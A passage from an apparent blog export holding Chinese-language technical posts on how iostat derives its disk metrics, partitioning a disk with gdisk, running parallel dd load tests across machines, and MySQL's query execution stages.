part; } part_stat_unlock();} iostat 输出的计算注意，/proc/diskstats 已经将所有的素材都准备好了，对于iostat程序来说，就是将处理这些数据，给客户展现出更友好，更有意义的数值。事实上，iostat的源码非常的短，它属于sysstat这个开源软件，整个文件大小1619行。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950int read_sysfs_file_stat(int curr, char *filename, char *dev_name){ FILE *fp; struct io_stats sdev; int i; unsigned int ios_pgr, tot_ticks, rq_ticks, wr_ticks; unsigned long rd_ios, rd_merges_or_rd_sec, wr_ios, wr_merges; unsigned long rd_sec_or_wr_ios, wr_sec, rd_ticks_or_wr_sec; /* Try to read given stat file */ if ((fp = fopen(filename, "r")) == NULL) return 0; i = fscanf(fp, "%lu %lu %lu %lu %lu %lu %lu %u %u %u %u", &rd_ios, &rd_merges_or_rd_sec, &rd_sec_or_wr_ios, &rd_ticks_or_wr_sec, &wr_ios, &wr_merges, &wr_sec, &wr_ticks, &ios_pgr, &tot_ticks, &rq_ticks); if (i == 11) { /* Device or partition */ sdev.rd_ios = rd_ios; sdev.rd_merges = rd_merges_or_rd_sec; sdev.rd_sectors = rd_sec_or_wr_ios; sdev.rd_ticks = (unsigned int) rd_ticks_or_wr_sec; sdev.wr_ios = wr_ios; sdev.wr_merges = wr_merges; sdev.wr_sectors = wr_sec; sdev.wr_ticks = wr_ticks; sdev.ios_pgr = ios_pgr; sdev.tot_ticks = tot_ticks; sdev.rq_ticks = rq_ticks; } else if (i == 4) { /* Partition without extended statistics */ sdev.rd_ios = rd_ios; sdev.rd_sectors = rd_merges_or_rd_sec; sdev.wr_ios = rd_sec_or_wr_ios; sdev.wr_sectors = rd_ticks_or_wr_sec; } if ((i == 11) || !DISPLAY_EXTENDED(flags)) { /* * In fact, we _don't_ save stats if it's a partition without * extended stats and yet we want to display ext stats. */ save_stats(dev_name, curr, &sdev, iodev_nr, st_hdr_iodev); } fclose(fp); return 1;} 数据都采集到了，剩下就是计算了。其中下面几项的计算是非常简单的： rrqm/s wrqm/s r/s w/s rMB/s wMB/s 这几项的计算是非常简单的，就是采样两次，后一次的值减去前一次的值，然后除以时间间隔，得到平均值即可。因为这些/proc/diskstats中对应的值都是累加的，后一次减去前一次，即得到采样时间间隔内的新增量。不赘述。 avgrq-sz的计算123456789101112/* rrq/s wrq/s r/s w/s rsec wsec rqsz qusz await r_await w_await svctm %util */ cprintf_f(2, 8, 2, S_VALUE(ioj->rd_merges, ioi->rd_merges, itv), S_VALUE(ioj->wr_merges, ioi->wr_merges, itv)); cprintf_f(2, 7, 2, S_VALUE(ioj->rd_ios, ioi->rd_ios, itv), S_VALUE(ioj->wr_ios, ioi->wr_ios, itv)); cprintf_f(4, 8, 2, S_VALUE(ioj->rd_sectors, ioi->rd_sectors, itv) / fctr, S_VALUE(ioj->wr_sectors, ioi->wr_sectors, itv) / fctr, xds.arqsz, //此处是avgrq-sz S_VALUE(ioj->rq_ticks, ioi->rq_ticks, itv) / 1000.0);//此处是avgqu-sz 注意avgrq-sz来自xds的argsz变量，该变量是通过该函数计算得到的：1234567891011121314151617/*注意sdc中的c指的是current，sdp中的p指的是previous*/void compute_ext_disk_stats(struct stats_disk *sdc, struct stats_disk *sdp, unsigned long long itv, struct ext_disk_stats *xds){ double tput = ((double) (sdc->nr_ios - sdp->nr_ios)) * HZ / itv; xds->util = S_VALUE(sdp->tot_ticks, sdc->tot_ticks, itv); xds->svctm = tput ? xds->util / tput : 0.0; xds->await = (sdc->nr_ios - sdp->nr_ios) ? ((sdc->rd_ticks - sdp->rd_ticks) + (sdc->wr_ticks - sdp->wr_ticks)) / ((double) (sdc->nr_ios - sdp->nr_ios)) : 0.0; xds->arqsz = (sdc->nr_ios - sdp->nr_ios) ? ((sdc->rd_sect - sdp->rd_sect) + (sdc->wr_sect - sdp->wr_sect)) / ((double) (sdc->nr_ios - sdp->nr_ios)) : 0.0;} 注意nr_ios来自如下运算，即读IO和写IO的和 12sdc.nr_ios = ioi->rd_ios + ioi->wr_ios;sdp.nr_ios = ioj->rd_ios + ioj->wr_ios; 那么xds->arqsz 的计算就是如下含义：1234xds->arqsz = (读扇区总数 + 写扇区总数)/(读IO次数+写IO次数)xds->arqsz = (sdc->nr_ios - sdp->nr_ios) ? ((sdc->rd_sect - sdp->rd_sect) + (sdc->wr_sect - sdp->wr_sect)) / ((double) (sdc->nr_ios - sdp->nr_ios)) : 0.0; 好吧。反正我是非常不理解这他妈的咋回事😂。avgqu-sz的计算平均队列长度的计算，这个计算就用到了diskstats中time_in_queue这个值。这个值的计算来自这句话：1S_VALUE(ioj->rq_ticks, ioi->rq_ticks, itv) / 1000.0) 其中rq_ticks即diskstats中的time_in_queue。 我们考虑如下的场景，如果IO请求有一个burst，同一时间来了250个IO请求，后续再也没有新的请求到来。这种情况下，每个请求处理时间都是4ms，那么所有IO的平均等待时间为：1平均等待时间 = 单个请求处理时间*(1+2+3+4...+(请求总数-1))/请求总数 对于我们这个例子而言，平均等待时间是4*125 = 500 ms 那么所有IO花费的总时间为250*500=125000毫秒，这个时间除以1000毫秒：1125000/1000 = 125 即平均下来，队列的长度是125 ，这个值很明显是符合直观的。排在队列最前端的IO认为，队列的长度是0，第2个IO认为队列的长度是1，第3个IO认为队列的长度是2，最后一个认为队列的长度是249。 我们换一种思路来考虑，即diskstats中time_in_queue的思路。 当第一个IO完成的时候，队列中250个IO，250个IO都等了4ms，即time_in_queue + = (2504) ，当第二个IO完成的时候，time_in_queue += (2494)，当所有IO都完成的时候，time_in_queue = 4*(250+249+248….+1)， … 根据time_in_queue/1000,殊途同归地获得了平均队列长度。 await、r_wait及w_wait的计算123456789void compute_ext_disk_stats(struct stats_disk *sdc, struct stats_disk *sdp, unsigned long long itv, struct ext_disk_stats *xds){ ... xds->await = (sdc->nr_ios - sdp->nr_ios) ? ((sdc->rd_ticks - sdp->rd_ticks) + (sdc->wr_ticks - sdp->wr_ticks)) / ((double) (sdc->nr_ios - sdp->nr_ios)) : 0.0; ...} 这个没啥好说的了：1await = ((所有读IO的时间)+(所有写IO的时间))/((读请求的个数) + (写请求的个数)) 注意一点就行了，这个所有读IO的时间和所有写IO的时间，都是包括IO在队列的时间在内的。不能一厢情愿地认为，是磁盘控制器处理该IO的时间。 注意，能不能说，await比较高，所以武断地判定这块盘的能力很菜？答案是不能。await这个值不能反映硬盘设备的性能。await的这个值不能反映硬盘设备的性能，await这个值不能反映硬盘设备的性能，重要的话讲三遍。 我们考虑两种IO的模型 250个IO请求同时进入等待队列 250个IO请求同时进入等待队列 第一种情况await高达500ms，第二个情况await只有4ms，但是都是同一块盘。 但是注意await是相当重要的一个参数，它表明了用户发起的IO请求的平均延迟：1wait = IO 平均处理时间 + IO在队列的平均等待时间 因此，这个指标是比较重要的一个指标😳。 %util 和磁盘设备饱和度注意，%util是最容易让人产生误解的一个参数。很多初学者看到%util 等于100%就说硬盘能力到顶了，这种说法是错误的😨。%util数据源自diskstats中的io_ticks，这个值并不关心等待在队里里面IO的个数，它只关心队列中有没有IO。 和超时排队结账这个类比最本质的区别在于，现代硬盘都有并行处理多个IO的能力，但是收银员没有。收银员无法做到同时处理10个顾客的结账任务而消耗的总时间与处理一个顾客结账任务相差无几。但是磁盘可以。所以，即使%util到了100%，也并不意味着设备饱和了。 最简单的例子是，某硬盘处理单个IO请求需要0.1秒，有能力同时处理10个。但是当10个请求依次提交的时候，需要1秒钟才能完成这10%的请求，，在1秒的采样周期里，%util达到了100%。但是如果10个请一次性提交的话， 硬盘可以在0.1秒内全部完成，这时候，%util只有10%。 因此，在上面的例子中，一秒中10个IO，即IOPS=10的时候，%util就达到了100%，这并不能表明，该盘的IOPS就只能到10，事实上，纵使%util到了100%，硬盘可能仍然有很大的余力处理更多的请求，即并未达到饱和的状态。 下一小节有4张图，可以看到当IOPS为1000的时候%util为100%，但是并不意味着该盘的IOPS就在1000，实际上2000，3000,5000的IOPS都可以达到。根据%util 100%时的 r/s 或w/s 来推算磁盘的IOPS是不对的。 那么有没有一个指标用来衡量硬盘设备的饱和程度呢。很遗憾，iostat没有一个指标可以衡量磁盘设备的饱和度。 svctm的计算对于iostat这个功能而言，%util固然会给人带来一定的误解和苦扰，但是svctm给人带来的误解更多。一直以来，人们希望了解块设备处理单个IO的service time，这个指标直接地反应了硬盘的能力。 回到超市收银这个类比中，如果收银员是个老手，操作流，效率很高，那么大家肯定更愿意排这一队。但是如果收银员是个新手，各种操作不熟悉，动作慢，效率很低，那么同样多的任务，就会花费更长的时间。因此IO的平均service time（不包括排队时间）是非常有意义的。 但是service time和iostat无关，iostat没有任何一个参数能够提供这方面的信息。而svctm这个输出给了人们这种美好的期待，却只能让人空欢喜。 从现在起，我们记住，我们不能从svctm中得到自己期待的service time这个值，这个值其实并没有什么意义，事实上，这个值不是独立的，它是根据其他值计算出来的。12345678910void compute_ext_disk_stats(struct stats_disk *sdc, struct stats_disk *sdp, unsigned long long itv, struct ext_disk_stats *xds) { double tput = ((double) (sdc->nr_ios - sdp->nr_ios)) * HZ / itv; xds->util = S_VALUE(sdp->tot_ticks, sdc->tot_ticks, itv); xds->svctm = tput ? xds->util / tput : 0.0; ...} 如果一个盘的能力很强悍，随机小IO（4K）fio测试中我们会看到如下现象：当IOPS为1000的时候，iosta输出的svctm为1(ms)，当IOPS为2000的时候，iostat输出的svctm为0.5(ms),当IOPS为3000的时候，iostat输出的svctm为0.33。原因其实无他，因为这种情况下%util都是100%，即当采样周期是1秒的时候，用满了1秒，tput就是fio指定的–rate-iops 即1000、2000、3000，因此算出来svctm为对应的1、0.5、0.33。 注意上面的盘sdg是iSCSI，存储空间是由分布式存储提供，不要问我为什么单个盘随机IOPS能无压力的到5000） 因此从这个例子看，把iostat的输出中的svctm看作是IO的处理时间是相当不靠谱的。为了防止带来的误解，可以直接忽略这个参数。 既然svctm不能反映IO处理时间，那么有没有一个参数可以测量块设备的IO平均处理时间呢？很遗憾iostat是做不到的。但是只要思想不滑坡，办法总比困难多，blktrace这个神器可能得到这个设备的IO平均处理时间。 接下来我们就可以进入另一个天地😇。 尾声iostat能够提供给我们的信息就这么多了，通过分析我们期待能够得到块设备处理IO的时间，这就要靠blocktrace这个工具了。blktrace可以讲IO路径分段，分别统计各段的消耗的时间。 本文大量参考vmunix的容易被误读的IOSTAT，以及深入分析diskstats，其中第二篇文章给出了一个很详细的IO PATH的流程图，非常有用。第二篇文章中随着代码演进有一些变化，本文采用的比较新的Linux Kernel code做介绍，同时演算io_ticks和time_in_queue部分第二篇文章也有错误，也一并修正了。不过瑕不掩瑜，这两篇都是非常棒的文章。向前辈致敬。 本文来自于Bean Li document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdisk_常用操作]]></title>
    <url>%2F2019%2F03%2F11%2Fgdisk-%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[前言传统的老牌的分区工具是fdisk，但是fdisk出道太早，只支持MBR（Master Boot Record），并不支持GPT（GUID Partition Table），无法操作超过2T的磁盘，因此gdisk parted等分区工具横空出世。gdisk和parted都曾经用过，但是我更喜欢gdisk，因为使用上，gdisk 上承fdisk，没有太多的学习负担。另外我们QA测出过，parted方式分区，在某些使用上会有问题。使用方法首先，我有一个sdd，作为我操作的对象。1234567891011121314151617root@test:~# lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTfd0 2:0 1 4K 0 disk sda 8:0 0 40G 0 disk ├─sda1 8:1 0 30.5M 0 part ├─sda2 8:2 0 488.3M 0 part ├─sda3 8:3 0 31.1G 0 part /├─sda4 8:4 0 8G 0 part [SWAP]└─sda5 8:5 0 387.8M 0 part sdb 8:16 0 50G 0 disk ├─sdb1 8:17 0 4G 0 part └─sdb2 8:18 0 46G 0 part /data/osd.4sdc 8:32 0 50G 0 disk ├─sdc1 8:33 0 4G 0 part └─sdc2 8:34 0 46G 0 part /data/osd.5sdd 8:48 0 500G 0 disk sr0 11:0 1 1.6G 0 rom 查看help信息进入交互模式之后，输入h可以查看帮助信息123456789101112131415161718192021222324252627282930root@test:~# gdisk /dev/sddGPT fdisk (gdisk) version 0.8.1Partition table scan: MBR: protective BSD: not present APM: not present GPT: presentFound valid GPT with protective MBR; using GPT.Command (? for help): h b back up GPT data to a filec change a partition's named delete a partitioni show detailed information on a partitionl list known partition typesn add a new partitiono create a new empty GUID partition table (GPT)p print the partition tableq quit without saving changesr recovery and transformation options (experts only)s sort partitionst change a partition's type codev verify diskw write table to disk and exitx extra functionality (experts only)? print this menuCommand (? for help): 查看分区表信息很明显，做出没有分区，所以分区表为空,后面创建分区之后，可以通过p命令查看分区信息123456789101112Command (? for help): pDisk /dev/sdd: 1048576000 sectors, 500.0 GiBLogical sector size: 512 bytesDisk identifier (GUID): D3328858-7A3F-4A64-BC46-A7040F306F33Partition table holds up to 128 entriesFirst usable sector is 34, last usable sector is 104857566Partitions will be aligned on 2048-sector boundariesTotal free space is 1048575330 sectors (500.0 GiB)Number Start (sector) End (sector) Size Code NameCommand (? for help): 创建分区打算将500G的空间划分成2个分区，分别是100G和400G： 创建分区是用命令n，你需要选择1.分区number2.起始扇区3.结束扇区 起始扇区可以敲回车选择默认值，而结束扇区用＋100G这种方式来决定分区大小为100G 分区后，可以用p命令查看最新的分区表123456789101112131415161718192021222324252627282930313233343536373839404142434445Command (? for help): n Partition number (1-128, default 1): 1First sector (34-1048575660, default = 34) or {+-}size{KMGTP}: Information: Moved requested sector from 34 to 2048 inorder to align on 2048-sector boundaries.Use 'l' on the experts' menu to adjust alignmentLast sector (2048-1048575660, default = 1048575660) or {+-}size{KMGTP}: +100GCurrent type is 'Linux filesystem'Hex code or GUID (L to show codes, Enter = 8300): Changed type of partition to 'Linux filesystem'Command (? for help): pDisk /dev/sdd: 1048576000 sectors, 500.0 GiBLogical sector size: 512 bytesDisk identifier (GUID): D3328858-7A3F-4A64-BC46-A7040F366F33Partition table holds up to 128 entriesFirst usable sector is 34, last usable sector is 104857566Partitions will be aligned on 2048-sector boundariesTotal free space is 83886013 sectors (40.0 GiB)Number Start (sector) End (sector) Size Code Name 1 2048 20973567 100.0 GiB 8300 Linux filesystemCommand (? for help): nPartition number (2-128, default 2): 2First sector (34-104857566, default = 20973568) or {+-}size{KMGTP}: Last sector (20973568-104857566, default = 104857566) or {+-}size{KMGTP}: Current type is 'Linux filesystem'Hex code or GUID (L to show codes, Enter = 8300): Changed type of partition to 'Linux filesystem'Command (? for help): pDisk /dev/sdd: 1048576000 sectors, 500.0 GiBLogical sector size: 512 bytesDisk identifier (GUID): D3328858-7A3F-4A64-BC46-A7040F366F33Partition table holds up to 128 entriesFirst usable sector is 34, last usable sector is 1048575660Partitions will be aligned on 2048-sector boundariesTotal free space is 2014 sectors (1007.0 KiB)Number Start (sector) End (sector) Size Code Name 1 2048 209735677 100.0 GiB 8300 Linux filesystem 2 209735678 1048575660 400.0 GiB 8300 Linux filesystemCommand (? for help): 设置分区标签信息partlabel有些时候，磁盘的盘符会漂移，使用sdx这种方式来分辨磁盘是不靠谱，使用lable这种方式是可靠的。那么如何创建分区标签呢？c 是用来设置partlable的1234567891011121314151617181920Command (? for help): c Partition number (1-2): 1Enter name: test1Command (? for help): cPartition number (1-2): 2Enter name: test2Command (? for help): pDisk /dev/sdd: 1048576000 sectors, 500.0 GiBLogical sector size: 512 bytesDisk identifier (GUID): D3328858-7A3F-4A64-BC46-A7040F366F33Partition table holds up to 128 entriesFirst usable sector is 34, last usable sector is 1048575660Partitions will be aligned on 2048-sector boundariesTotal free space is 2014 sectors (1007.0 KiB)Number Start (sector) End (sector) Size Code Name 1 2048 209735677 100.0 GiB 8300 bean_part1 2 209735678 1048575660 400.0 GiB 8300 bean_part2 保存分区信息我们将磁盘分成了2个区，给每一个分区贴上了partlabel，但是退出gdisk之前必须保存，否则前功尽弃。123456789Command (? for help): wFinal checks complete. About to write GPT data. THIS WILL OVERWRITE EXISTINGPARTITIONS!!Do you want to proceed? (Y/N): yOK; writing new GUID partition table (GPT).The operation has completed successfully.root@test:~# 效果愉快地查看分区效果吧：1234567891011121314151617181920212223242526root@test:~# lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTfd0 2:0 1 4K 0 disk sda 8:0 0 40G 0 disk ├─sda1 8:1 0 30.5M 0 part ├─sda2 8:2 0 488.3M 0 part ├─sda3 8:3 0 31.1G 0 part /├─sda4 8:4 0 8G 0 part [SWAP]└─sda5 8:5 0 387.8M 0 part sdb 8:16 0 50G 0 disk ├─sdb1 8:17 0 4G 0 part └─sdb2 8:18 0 46G 0 part /data/osd.4sdc 8:32 0 50G 0 disk ├─sdc1 8:33 0 4G 0 part └─sdc2 8:34 0 46G 0 part /data/osd.5sdd 8:48 0 500G 0 disk ├─sdd1 8:49 0 100G 0 part └─sdd2 8:50 0 400G 0 part sr0 11:0 1 1.6G 0 rom root@test:~# ll /dev/disk/by-partlabel/total 0drwxr-xr-x 2 root root 180 Apr 1 22:23 ./drwxr-xr-x 9 root root 180 Apr 1 21:34 ../lrwxrwxrwx 1 root root 10 Apr 1 22:23 test1 -> ../../sdd1lrwxrwxrwx 1 root root 10 Apr 1 22:23 test2 -> ../../sdd2... document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[存储的性能]]></title>
    <url>%2F2019%2F03%2F11%2F%E5%AD%98%E5%82%A8%E7%9A%84%E6%80%A7%E8%83%BD%2F</url>
    <content type="text"><![CDATA[前言比如我想测试400路并发写10G的大文件，一共写入2000个文件1seq 1 2000 |xargs -P 400 -I {} dd if=/dev/zero of=file_{} bs=1M count=10240 oflag=direct 注:xargs 参数中 -P 选项相当逆天，保持400路并发。但是如果需要多台测试机，比如多台client机通过NFS测试写入，怎么办？其实我们需要的是将xargs 逆天的能力扩展到多台机器。parallel作为主角，是时候登场了安装步骤安装 parallel 包1234# Ubunt/Dabinsudo apt-get install parallel# Linuxyum install parallel 修改parallel的配置文件简单地说，就是删除–tollef12cat /etc/parallel/config--tollef 测试可用性可以用简单的sleep命令来测试parallel的可用性：12seq 1 100 ｜parallel -j 2 -S 10.16.17.17 -S 10.16.17.169 sleep {}# 参数 -j 表示每次分发几个job，比如本例子中，每次发两个任务，即每台机器上会有两个sleep任务在跑。 注意节点之间需要设置ssh无需输入密码 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一条SQL查询语句是如何执行的？]]></title>
    <url>%2F2019%2F01%2F28%2FstudyMySQL-01%2F</url>
    <content type="text"><![CDATA[比如，你有个最简单的表，表里只有一个ID字段，在执行下面这个查询语句时：1mysql> SELECT * FROM T WHERE ID=10; 看到的只是输入一条语句，返回一个结果，却不知道这条语句在MySQL内部的执行过程。 所以一起把MySQL拆解一下，看看里面都有哪些”零件”，希望借由这个拆解过程，对MySQL有更深入的理解。这样当碰到MySQL的一些异常或者问题时，就能够直戳本质，更为快速地定位并解决问题。 下面的是MySQL的基本架构示意图，从中可以清楚地看到SQL语句在MySQL的各个功能模块中的执行过程。 大体来说，MySQL可以分为Server层和存储引擎层两部分。 Server层包括连接器、查询缓存、分析器、优化器、执行器等，涵盖MySQL的大多数核心服务功能，以及所有的内置函数（如日期、时间、数学和加密函数等），所有跨存储引擎的功能都在这一层实现，比如存储过程、触发器、视图等。 而存储引擎层负责数据的存储和提取。其架构模式是插件式的，支持InnoDB、MyISAM、Memory等多个存储引擎。现在最常用的存储引擎是InnoDB，它从MySQL 5.5.5版本开始成为了默认存储引擎。 也就是说，你执行create table建表的时候，如果不指定引擎类型，默认使用的就是InnoDB。不过，你也可以通过指定存储引擎的类型来选择别的引擎，比如在create table语句中使用engine=memory, 来指定使用内存引擎创建表。不同存储引擎的表数据存取方式不同，支持的功能也不同，在后面的文章中，我们会讨论到引擎的选择。 从图中不难看出，不同的存储引擎共用一个Server层，也就是从连接器到执行器的部分。你可以先对每个组件的名字有个印象，接下来我会结合开头提到的那条SQL语句，带你走一遍整个执行流程，依次看下每个组件的作用。 连接器第一步先连接到这个数据库上，这时候接待你的就是连接器。连接器负责跟客户端建立连接、获取权限、维持和管理连接。连接命令一般是这么写的：1mysql -h$ip -P$port -u$user -p 输完命令之后，你就需要在交互对话里面输入密码。虽然密码也可以直接跟在-p后面写在命令行中，但这样可能会导致你的密码泄露。如果你连的是生产服务器，强烈建议你不要这么做。 连接命令中的mysql是客户端工具，用来跟服务端建立连接。在完成经典的TCP握手后，连接器就要开始认证你的身份，这个时候用的就是你输入的用户名和密码。 * 如果用户名或密码不对，你就会收到一个"Access denied for user"的错误，然后客户端程序结束执行。 * 如果用户名密码认证通过，连接器会到权限表里面查出你拥有的权限。之后，这个连接里面的权限判断逻辑，都将依赖于此时读到的权限。 这就意味着，一个用户成功建立连接后，即使你用管理员账号对这个用户的权限做了修改，也不会影响已经存在连接的权限。修改完成后，只有再新建的连接才会使用新的权限设置。 连接完成后，如果你没有后续的动作，这个连接就处于空闲状态，你可以在show processlist命令中看到它。文本中这个图是show processlist的结果，其中的Command列显示为“Sleep”的这一行，就表示现在系统里面有一个空闲连接。 客户端如果太长时间没动静，连接器就会自动将它断开。这个时间是由参数 wait_timeout 控制的，默认值是8小时。 如果在连接被断开之后，客户端再次发送请求的话，就会收到一个错误提醒： Lost connection to MySQL server during query。这时候如果你要继续，就需要重连，然后再执行请求了。 数据库里面，长连接是指连接成功后，如果客户端持续有请求，则一直使用同一个连接。短连接则是指每次执行完很少的几次查询就断开连接，下次查询再重新建立一个。 建立连接的过程通常是比较复杂的，所以我建议你在使用中要尽量减少建立连接的动作，也就是尽量使用长连接。 但是全部使用长连接后，可能会发现，有些时候MySQL占用内存涨得特别快，这是因为MySQL在执行过程中临时使用的内存是管理在连接对象里面的。这些资源会在连接断开的时候才释放。所以如果长连接累积下来，可能导致内存占用太大，被系统强行杀掉（OOM），从现象看就是MySQL异常重启了。 怎么解决这个问题呢？你可以考虑以下两种方案。 *定期断开长连接。使用一段时间，或者程序里面判断执行过一个占用内存的大查询后，断开连接，之后要查询再重连。 *如果你用的是 MySQL 5.7或更新版本，可以在每次执行一个比较大的操作后，通过执行 mysql_reset_connection 来重新初始化连接资源。这个过程不需要重连和重新做权限验证，但是会将连接恢复到刚刚创建完时的状态。 查询缓存连接建立完成后，就可以执行 SELECT 语句了。执行逻辑就会来到第二步：查询缓存。 MySQL拿到一个查询请求后，会先到查询缓存看看，之前是不是执行过这条语句。之前执行过的语句及其结果可能会以 key-value 对的形式，被直接缓存在内存中。key是查询的语句，value是查询的结果。如果你的查询能够直接在这个缓存中找到key，那么这个value就会被直接返回给客户端。 如果语句不在查询缓存中，就会继续后面的执行阶段。执行完成后，执行结果会被存入查询缓存中。你可以看到，如果查询命中缓存，MySQL不需要执行后面的复杂操作，就可以直接返回结果，这个效率会很高。 但是大多数情况下我会建议你不要使用查询缓存，为什么呢？因为查询缓存往往弊大于利。 查询缓存的失效非常频繁，只要有对一个表的更新，这个表上所有的查询缓存都会被清空。因此很可能你费劲地把结果存起来，还没使用呢，就被一个更新全清空了。对于更新压力大的数据库来说，查询缓存的命中率会非常低。除非你的业务就是有一张静态表，很长时间才会更新一次。比如，一个系统配置表，那这张表上的查询才适合使用查询缓存。 好在MySQL也提供了这种“按需使用”的方式。你可以将参数query_cache_type设置成DEMAND，这样对于默认的SQL语句都不使用查询缓存。而对于你确定要使用查询缓存的语句，可以用SQL_CACHE显式指定，像下面这个语句一样：1234mysql> SELECT SQL_CACHE * FROM T WHERE ID=10;------------------------------------------------注: MySQL 8.0版本直接将查询缓存的整块功能删掉了，也就是说8.0开始彻底没有这个功能了。 分析器如果没有命中查询缓存，就要开始真正执行语句了。首先，MySQL需要知道你要做什么，因此需要对SQL语句做解析。 分析器先会做“词法分析”。你输入的是由多个字符串和空格组成的一条SQL语句，MySQL需要识别出里面的字符串分别是什么，代表什么。 MySQL从你输入的”SELECT/select”这个关键字识别出来，这是一个查询语句。它也要把字符串“T”识别成“表名T”，把字符串“ID”识别成“列ID”。 做完了这些识别以后，就要做“语法分析”。根据词法分析的结果，语法分析器会根据语法规则，判断你输入的这个SQL语句是否满足MySQL语法。 如果你的语句不对，就会收到“You have an error in your SQL syntax”的错误提醒，比如下面这个语句select少打了开头的字母“s”。123mysql> elect * from t where ID=1;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'elect * from t where ID=1' at line 1 一般语法错误会提示第一个出现错误的位置，所以你要关注的是紧接“use near”的内容。 优化器经过了分析器，MySQL就知道你要做什么了。在开始执行之前，还要先经过优化器的处理。 优化器是在表里面有多个索引的时候，决定使用哪个索引；或者在一个语句有多表关联（join）的时候，决定各个表的连接顺序。比如你执行下面这样的语句，这个语句是执行两个表的join： 1mysql> select * from t1 join t2 using(ID) where t1.c=10 and t2.d=20 * 既可以先从表t1里面取出c=10的记录的ID值，再根据ID值关联到表t2，再判断t2里面d的值是否等于20。 * 也可以先从表t2里面取出d=20的记录的ID值，再根据ID值关联到t1，再判断t1里面c的值是否等于10。 这两种执行方法的逻辑结果是一样的，但是执行的效率会有不同，而优化器的作用就是决定选择使用哪一个方案。 优化器阶段完成后，这个语句的执行方案就确定下来了，然后进入执行器阶段。如果你还有一些疑问，比如优化器是怎么选择索引的，有没有可能选择错等等，没关系，我会在后面的文章中单独展开说明优化器的内容 执行器MySQL通过分析器知道了你要做什么，通过优化器知道了该怎么做，于是就进入了执行器阶段，开始执行语句。 开始执行的时候，要先判断一下你对这个表T有没有执行查询的权限，如果没有，就会返回没有权限的错误，如下所示。123mysql> select * from T where ID=10;ERROR 1142 (42000): SELECT command denied to user 'b'@'localhost' for table 'T' 如果有权限，就打开表继续执行。打开表的时候，执行器就会根据表的引擎定义，去使用这个引擎提供的接口。 比如我们这个例子中的表T中，ID字段没有索引，那么执行器的执行流程是这样的： 调用InnoDB引擎接口取这个表的第一行，判断ID值是不是10，如果不是则跳过，如果是则将这行存在结果集中； 调用引擎接口取“下一行”，重复相同的判断逻辑，直到取到这个表的最后一行。 执行器将上述遍历过程中所有满足条件的行组成的记录集作为结果集返回给客户端。 至此，这个语句就执行完成了。 对于有索引的表，执行的逻辑也差不多。第一次调用的是“取满足条件的第一行”这个接口，之后循环取“满足条件的下一行”这个接口，这些接口都是引擎中已经定义好的。 你会在数据库的慢查询日志中看到一个 rows_examined 的字段，表示这个语句执行过程中扫描了多少行。这个值就是在执行器每次调用引擎获取数据行的时候累加的。 在有些场景下，执行器调用一次，在引擎内部则扫描了多行，因此引擎扫描行数跟rows_examined并不是完全相同的。我们后面会专门有一篇文章来讲存储引擎的内部机制，里面会有详细的说明。 小结介绍了MySQL的SQL逻辑架构，希望对一个SQL语句完整执行流程的各个阶段有了一个初步的印象。我只是用一个查询的例子将各个环节过了一遍。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL学习笔记</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试]]></title>
    <url>%2F2019%2F01%2F28%2F%E9%9D%A2%E8%AF%95%2F</url>
